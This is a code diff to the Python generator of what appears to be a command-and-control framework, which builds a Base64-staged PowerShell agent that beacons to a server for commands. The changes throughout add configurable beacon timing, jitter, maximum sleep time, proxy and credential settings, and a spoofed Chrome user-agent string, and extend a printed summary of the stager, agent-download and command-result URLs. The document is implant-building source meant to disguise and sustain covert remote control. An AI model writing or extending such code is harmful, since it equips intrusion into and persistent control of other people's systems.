@@ -6,7 +6,7 @@ import importlib.util
 import shutil
 from pathlib import Path
 
-def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="/command_result", rotation_info=None):
+def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="/command_result", rotation_info=None, agent_config=None):
     """Generate PowerShell agent code with secure key exchange and dynamic path rotation"""
     # Ensure all paths have leading slashes
     if not beacon_path.startswith('/'):
@@ -25,11 +25,23 @@ def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="
         next_rotation = str(int(time.time()) + 3600)
         rotation_interval = "3600"
     
-    # Default agent configuration values
-    beacon_interval = 5
-    jitter_percentage = 20
-    max_failures = 3
-    max_backoff = 300
+    # Use provided agent config or defaults
+    if agent_config is None:
+        agent_config = {}
+        
+    # Default agent configuration values with fallbacks
+    beacon_interval = agent_config.get('beacon_period', 5)
+    jitter_percentage = agent_config.get('jitter_percentage', 20)
+    max_failures = agent_config.get('max_failures_before_fallback', 3)
+    max_backoff = agent_config.get('max_backoff_time', 300)
+    max_sleep_time = agent_config.get('max_sleep_time', 600)
+    user_agent = agent_config.get('user_agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
+    username = agent_config.get('username', "")
+    password = agent_config.get('password', "")
+    proxy_enabled = "$true" if agent_config.get('proxy_enabled', False) else "$false"
+    proxy_type = agent_config.get('proxy_type', "system")
+    proxy_server = agent_config.get('proxy_server', "")
+    proxy_port = agent_config.get('proxy_port', "")
     
     # Generate the agent using the templates
     agent_code = generate_from_templates(
@@ -43,7 +55,15 @@ def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="
         beacon_interval=beacon_interval,
         jitter_percentage=jitter_percentage,
         max_failures=max_failures,
-        max_backoff=max_backoff
+        max_backoff=max_backoff,
+        max_sleep_time=max_sleep_time,
+        user_agent=user_agent,
+        username=username,
+        password=password,
+        proxy_enabled=proxy_enabled,
+        proxy_type=proxy_type,
+        proxy_server=proxy_server,
+        proxy_port=proxy_port
     )
     
     return agent_code
@@ -96,10 +116,7 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     server_address = f"{host}:{port}"
     
     # Get agent configuration
-    beacon_interval = 5  # Default
-    jitter_percentage = 20  # Default
-    max_failures = 3  # Default
-    max_backoff = 300  # Default
+    agent_config = {}
     
     # Try to load agent config
     agent_config_file = os.path.join(campaign_folder, "agent_config.json")
@@ -107,10 +124,8 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         try:
             with open(agent_config_file, 'r') as f:
                 agent_config = json.load(f)
-                beacon_interval = int(agent_config.get("beacon_period", beacon_interval))
-                jitter_percentage = int(agent_config.get("jitter_percentage", jitter_percentage))
-                max_failures = int(agent_config.get("max_failures_before_fallback", max_failures))
-                max_backoff = int(agent_config.get("max_backoff_time", max_backoff))
+                # Log that we loaded the config
+                print(f"Loaded agent configuration from {agent_config_file}")
         except Exception as e:
             print(f"Warning: Could not load agent config: {e}")
     
@@ -132,7 +147,7 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         except Exception as e:
             print(f"Warning: Could not load path rotation state: {e}")
     
-    # Generate agent code using templates with simplified parameters
+    # Generate agent code using templates with additional parameters
     agent_ps1 = generate_from_templates(
         server_address=server_address,
         beacon_path=url_paths["beacon_path"],
@@ -141,10 +156,18 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         rotation_id=str(rotation_id),
         next_rotation_time=str(next_rotation_time),
         rotation_interval=str(rotation_interval),
-        beacon_interval=beacon_interval,
-        jitter_percentage=jitter_percentage,
-        max_failures=max_failures,
-        max_backoff=max_backoff
+        beacon_interval=agent_config.get("beacon_period", 5),
+        jitter_percentage=agent_config.get("jitter_percentage", 20),
+        max_failures=agent_config.get("max_failures_before_fallback", 3),
+        max_backoff=agent_config.get("max_backoff_time", 300),
+        max_sleep_time=agent_config.get("max_sleep_time", 600),
+        user_agent=agent_config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"),
+        username=agent_config.get("username", ""),
+        password=agent_config.get("password", ""),
+        proxy_enabled="$true" if agent_config.get("proxy_enabled", False) else "$false",
+        proxy_type=agent_config.get("proxy_type", "system"),
+        proxy_server=agent_config.get("proxy_server", ""),
+        proxy_port=agent_config.get("proxy_port", "")
     )
     
     # Create the Base64 stager with improved security for first contact
@@ -188,15 +211,21 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         f"   - Agent Download URL: {http}://{server_address}{url_paths['agent_path']}\n"
         f"   - Stager URL: {http}://{server_address}{url_paths['stager_path']}\n"
         f"   - Command Result URL: {http}://{server_address}{url_paths['cmd_result_path']}\n"
-        f"6. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
-        f"7. Headers: Legitimate web browsing headers included\n"
-        f"8. Error Handling: Enhanced error reporting enabled\n"
-        f"9. First Contact Security: Minimal data sent until encryption established\n"
-        f"10. Beacon Configuration:\n"
-        f"   - Interval: {beacon_interval} seconds\n" 
-        f"   - Jitter: {jitter_percentage}%\n"
+        f"6. User-Agent: {agent_config.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')}\n"
+        f"7. Beacon Configuration:\n"
+        f"   - Interval: {agent_config.get('beacon_period', 5)} seconds\n" 
+        f"   - Jitter: {agent_config.get('jitter_percentage', 20)}%\n"
+        f"   - Max Sleep Time: {agent_config.get('max_sleep_time', 600)} seconds\n"
         f"   - Path Rotation: {'Enabled' if rotation_enabled else 'Disabled'}\n"
         f"   - Rotation Interval: {rotation_interval} seconds\n"
+        f"8. Proxy Settings:\n"
+        f"   - Proxy Enabled: {agent_config.get('proxy_enabled', False)}\n"
+        f"   - Proxy Type: {agent_config.get('proxy_type', 'system')}\n"
+        f"   - Server: {agent_config.get('proxy_server', '')}\n"
+        f"   - Port: {agent_config.get('proxy_port', '')}\n"
+        f"9. Authentication:\n"
+        f"   - Username: {'Configured' if agent_config.get('username', '') else 'Not used'}\n"
+        f"   - Password: {'Configured' if agent_config.get('password', '') else 'Not used'}\n"
     )
     
     # Save detailed information
@@ -210,8 +239,11 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
 
 def generate_from_templates(server_address, beacon_path, cmd_result_path,
                            rotation_enabled, rotation_id, next_rotation_time, rotation_interval,
-                           beacon_interval, jitter_percentage, max_failures, max_backoff):
-    """Generate the PowerShell agent code from templates"""
+                           beacon_interval, jitter_percentage, max_failures, max_backoff,
+                           max_sleep_time=600, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                           username="", password="", proxy_enabled="false", proxy_type="system",
+                           proxy_server="", proxy_port=""):
+    """Generate the PowerShell agent code from templates with all the new options"""
     
     # Get template paths
     script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -252,5 +284,13 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
     agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
     agent_code = agent_code.replace("{{MAX_FAILURES}}", str(max_failures))
     agent_code = agent_code.replace("{{MAX_BACKOFF}}", str(max_backoff))
+    agent_code = agent_code.replace("{{MAX_SLEEP_TIME}}", str(max_sleep_time))
+    agent_code = agent_code.replace("{{USER_AGENT}}", user_agent)
+    agent_code = agent_code.replace("{{USERNAME}}", username)
+    agent_code = agent_code.replace("{{PASSWORD}}", password)
+    agent_code = agent_code.replace("{{PROXY_ENABLED}}", proxy_enabled)
+    agent_code = agent_code.replace("{{PROXY_TYPE}}", proxy_type)
+    agent_code = agent_code.replace("{{PROXY_SERVER}}", proxy_server)
+    agent_code = agent_code.replace("{{PROXY_PORT}}", proxy_port)
     
     return agent_code
